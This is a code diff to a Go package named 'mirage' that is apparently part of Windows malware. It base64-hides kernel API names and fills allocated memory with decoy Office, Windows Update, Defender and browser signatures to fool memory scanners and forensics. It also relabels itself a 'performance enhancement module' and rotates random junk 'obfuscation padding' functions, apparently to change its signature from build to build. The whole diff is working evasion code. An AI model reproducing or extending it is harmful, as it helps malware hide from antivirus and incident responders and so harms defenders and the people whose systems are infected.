@@ -1,6 +1,6 @@
 // OBFUSCATED
+// Performance enhancement module
 // System optimization routine
-// Windows compatibility layer
 package mirage
 
 import (
@@ -8,7 +8,6 @@ import (
 	"encoding/base64"
 	"math/big"
 	"os/exec"
-	"reflect"
 	"syscall"
 	"time"
 	"unsafe"
@@ -24,40 +23,11 @@ func d(s string) string {
 }
 
 var (
-	kernel32         = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
-	ntdll            = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
-	procVirtualAlloc = kernel32.NewProc(d("VmlydHVhbEFsbG9j"))
-	procVirtualFree  = kernel32.NewProc(d("VmlydHVhbEZyZWU="))
-	procCreateThread = kernel32.NewProc(d("Q3JlYXRlVGhyZWFk"))
-)
-
-// Helper function to safely write to memory using reflect
-func writeMemBytes(addr uintptr, data []byte) {
-	if addr == 0 || len(data) == 0 {
-		return
-	}
-	var slice []byte
-	sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
-	sh.Data = addr
-	sh.Len = len(data)
-	sh.Cap = len(data)
-	copy(slice, data)
-}
-
-// Helper to write single byte
-func writeMemByte(addr uintptr, offset int, value byte) {
-	if addr == 0 {
-		return
-	}
-	var slice []byte
-	sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
-	sh.Data = addr
-	sh.Len = offset + 1
-	sh.Cap = offset + 1
-	slice[offset] = value
-}
-
-var (
+	kernel32          = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
+	ntdll             = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
+	procVirtualAlloc  = kernel32.NewProc(d("VmlydHVhbEFsbG9j"))
+	procVirtualFree   = kernel32.NewProc(d("VmlydHVhbEZyZWU="))
+	procCreateThread  = kernel32.NewProc(d("Q3JlYXRlVGhyZWFk"))
 	procSleep         = kernel32.NewProc(d("U2xlZXA="))
 	procGetCurrentPID = kernel32.NewProc(d("R2V0Q3VycmVudFByb2Nlc3NJZA=="))
 )
@@ -107,21 +77,17 @@ func decoyOfficeActivity() {
 
 		if addr != 0 {
 			// Fill with patterns that resemble Office file formats
-			var slice []byte
-			sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
-			sh.Data = addr
-			sh.Len = 4096
-			sh.Cap = 4096
-
 			// DOCX signature (ZIP header)
-			slice[0] = 0x50
-			slice[1] = 0x4B
-			slice[2] = 0x03
-			slice[3] = 0x04
+			*(*byte)(unsafe.Pointer(addr)) = 0x50
+			*(*byte)(unsafe.Pointer(addr + 1)) = 0x4B
+			*(*byte)(unsafe.Pointer(addr + 2)) = 0x03
+			*(*byte)(unsafe.Pointer(addr + 3)) = 0x04
 
 			// Random XML-like content at offset 100
 			xmlContent := "<w:document xmlns:w=\"http://schemas.microsoft.com/word/2003/wordml\">"
-			copy(slice[100:], []byte(xmlContent))
+			for i, b := range []byte(xmlContent) {
+				*(*byte)(unsafe.Pointer(addr + 100 + uintptr(i))) = b
+			}
 
 			// Keep memory alive briefly
 			time.Sleep(time.Duration(2+i) * time.Second)
@@ -159,19 +125,18 @@ func decoyBrowserActivity() {
 		if addr != 0 {
 			// Fill with browser-like patterns
 			pattern := browserPatterns[i%len(browserPatterns)]
-			writeMemBytes(addr, []byte(pattern))
+			for j, b := range []byte(pattern) {
+				*(*byte)(unsafe.Pointer(addr + uintptr(j))) = b
+			}
 
 			// Simulate HTML content
 			htmlSnippet := "<div class='content'>Normal web content</div>"
 			for k := 0; k < 50; k++ {
 				offset := k * 1000
-				if offset < size && offset+len(htmlSnippet) < size {
-					var slice []byte
-					sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
-					sh.Data = addr
-					sh.Len = offset + len(htmlSnippet)
-					sh.Cap = offset + len(htmlSnippet)
-					copy(slice[offset:], []byte(htmlSnippet))
+				if offset < size {
+					for j, b := range []byte(htmlSnippet) {
+						*(*byte)(unsafe.Pointer(addr + uintptr(offset+j))) = b
+					}
 				}
 			}
 
@@ -218,14 +183,16 @@ func decoyBackgroundUpdate() {
 
 	if addr != 0 {
 		// CAB file signature (Windows Update format)
-		writeMemByte(addr, 0, 0x4D) // 'M'
-		writeMemByte(addr, 1, 0x53) // 'S'
-		writeMemByte(addr, 2, 0x43) // 'C'
-		writeMemByte(addr, 3, 0x46) // 'F'
+		*(*byte)(unsafe.Pointer(addr)) = 0x4D     // 'M'
+		*(*byte)(unsafe.Pointer(addr + 1)) = 0x53 // 'S'
+		*(*byte)(unsafe.Pointer(addr + 2)) = 0x43 // 'C'
+		*(*byte)(unsafe.Pointer(addr + 3)) = 0x46 // 'F'
 
 		// Fill with update-like metadata
 		updateData := "Microsoft-Windows-Update-Package-KB"
-		writeMemBytes(addr+100, []byte(updateData))
+		for i, b := range []byte(updateData) {
+			*(*byte)(unsafe.Pointer(addr + 100 + uintptr(i))) = b
+		}
 
 		// Keep alive longer to appear as real update
 		time.Sleep(15 * time.Second)
@@ -272,7 +239,9 @@ func memoryNoiseGenerator() {
 			}
 
 			// Copy to allocated memory
-			writeMemBytes(addr, buffer)
+			for i := 0; i < int(size); i++ {
+				*(*byte)(unsafe.Pointer(addr + uintptr(i))) = buffer[i]
+			}
 
 			// Keep alive for variable time
 			sleepTime, _ := rand.Int(rand.Reader, big.NewInt(5000))
@@ -400,19 +369,27 @@ func injectFalsePositives() {
 		// Inject patterns that look like known benign software signatures
 		// Windows Defender signature
 		sig1 := "MsMpEng.exe Normal Windows Defender Process"
-		writeMemBytes(addr, []byte(sig1))
+		for i, b := range []byte(sig1) {
+			*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+		}
 
 		// Office signature
 		sig2 := "WINWORD.EXE Microsoft Office Word Application"
-		writeMemBytes(addr+1000, []byte(sig2))
+		for i, b := range []byte(sig2) {
+			*(*byte)(unsafe.Pointer(addr + 1000 + uintptr(i))) = b
+		}
 
 		// Chrome signature
 		sig3 := "chrome.exe Google Chrome Browser Normal Activity"
-		writeMemBytes(addr+2000, []byte(sig3))
+		for i, b := range []byte(sig3) {
+			*(*byte)(unsafe.Pointer(addr + 2000 + uintptr(i))) = b
+		}
 
 		// Explorer signature
 		sig4 := "explorer.exe Windows Shell Normal User Interface"
-		writeMemBytes(addr+3000, []byte(sig4))
+		for i, b := range []byte(sig4) {
+			*(*byte)(unsafe.Pointer(addr + 3000 + uintptr(i))) = b
+		}
 
 		time.Sleep(10 * time.Second)
 		procVirtualFree.Call(addr, 0, MEM_RELEASE)
@@ -439,13 +416,19 @@ func timestampObfuscation() {
 			offset := i * 800
 
 			str1 := "LastModified: " + timeStr
-			writeMemBytes(addr+uintptr(offset), []byte(str1))
+			for j, b := range []byte(str1) {
+				*(*byte)(unsafe.Pointer(addr + uintptr(offset+j))) = b
+			}
 
 			str2 := "Created: " + timeStr
-			writeMemBytes(addr+uintptr(offset+100), []byte(str2))
+			for j, b := range []byte(str2) {
+				*(*byte)(unsafe.Pointer(addr + uintptr(offset+100+j))) = b
+			}
 
 			str3 := "Accessed: " + timeStr
-			writeMemBytes(addr+uintptr(offset+200), []byte(str3))
+			for j, b := range []byte(str3) {
+				*(*byte)(unsafe.Pointer(addr + uintptr(offset+200+j))) = b
+			}
 		}
 
 		time.Sleep(5 * time.Second)
@@ -477,7 +460,9 @@ func PolymorphicMemoryLayout() {
 			buffer := make([]byte, size)
 			rand.Read(buffer)
 
-			writeMemBytes(addr, buffer)
+			for i := 0; i < int(size); i++ {
+				*(*byte)(unsafe.Pointer(addr + uintptr(i))) = buffer[i]
+			}
 
 			// Variable lifetime
 			lifetime, _ := rand.Int(rand.Reader, big.NewInt(3000))
@@ -508,32 +493,38 @@ func InitializeMemoryMirage() {
 	time.Sleep(3 * time.Second)
 }
 
-// Obfuscation padding
-func obf_36413() {
-	_ = 52
-	var _ = "mhhe3lInmYHeb6S2p6DxoPJVeDw5v39hlwIfdlg4Wt73QlE7FD"
-}
+
 
 // Obfuscation padding
-func obf_36130() {
-	_ = 3879
-	var _ = "CwtHpqeyJBdteWOEXgeancXGo8D12jWtCMKLSrY6mayMlfru8I"
+func obf_36003() {
+    _ = 311
+    var _ = "2brj4ZIaW5bvPCGjOBiCg9RQYebuFW2mC9Kips2EKeqc4Odeni"
 }
 
-// Obfuscation padding
-func obf_84717() {
-	_ = 2091
-	var _ = "Yb0nO2B52imuPzP79PFeJi91lLBC4AmpMK2yxuvT368HausBM1"
-}
 
 // Obfuscation padding
-func obf_60589() {
-	_ = 233
-	var _ = "1BcBkWeUXbjfunweqTFdjwFLFQO2nleJi4OrFdhKL9rDgW7o2O"
+func obf_84614() {
+    _ = 2180
+    var _ = "RKl6cjQ0902TQ5H9pGo58T3Dbemf30U0haD2sWn8q5wdlURlK6"
 }
 
+
 // Obfuscation padding
-func obf_29087() {
-	_ = 8776
-	var _ = "Nmd2MW6Xx6rdGFIBDsJmt1LfGKCKP7LvCg6YAlP4BYigpxqtVx"
+func obf_36482() {
+    _ = 3734
+    var _ = "ZqwMxQD2N3joPqJkHzdFpAkDo7JhVwmNNVjkH8gIV0TKyAmIgh"
+}
+
+
+// Obfuscation padding
+func obf_22061() {
+    _ = 6200
+    var _ = "kgxr1eU3Qw6tlGbLbxdRNxjgNCWZrbDxxGqpVRD9zvSxyfK4sy"
+}
+
+
+// Obfuscation padding
+func obf_50850() {
+    _ = 7616
+    var _ = "ClUbDR5U3xUivLWWYqhMjtlBSS3DeAa28IrEGYvzV8DRLzvzcu"
 }
